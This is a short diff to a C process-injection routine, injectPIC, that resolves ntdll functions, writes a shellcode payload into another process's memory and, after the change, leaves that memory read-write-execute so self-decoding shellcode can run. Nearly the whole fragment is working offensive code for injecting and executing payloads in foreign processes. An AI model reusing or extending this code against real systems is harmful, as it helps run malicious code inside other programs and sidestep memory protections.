@@ -112,7 +112,6 @@ BOOL injectPIC(DWORD id, LPVOID code, DWORD codeLen) {
     HMODULE               hn;
     CLIENT_ID             cid;
     NTSTATUS              nt=~0UL;
-    DWORD                 t;
     
     // 1. resolve API address 
     hn = GetModuleHandle("ntdll.dll");
@@ -133,7 +132,8 @@ BOOL injectPIC(DWORD id, LPVOID code, DWORD codeLen) {
     printf("  [ writing code to %p.\n", cs);
     // 4. copy the payload to remote memory
     WriteProcessMemory(hp, cs, code, codeLen, &wr); 
-    VirtualProtectEx(hp, cs, codeLen, PAGE_EXECUTE_READ, &t);
+    // The memory stays RWX: the shellcode decodes itself in place and
+    // faults at once in read-only memory.
     
     printf("  [ press any key to continue.\n");
     getchar();
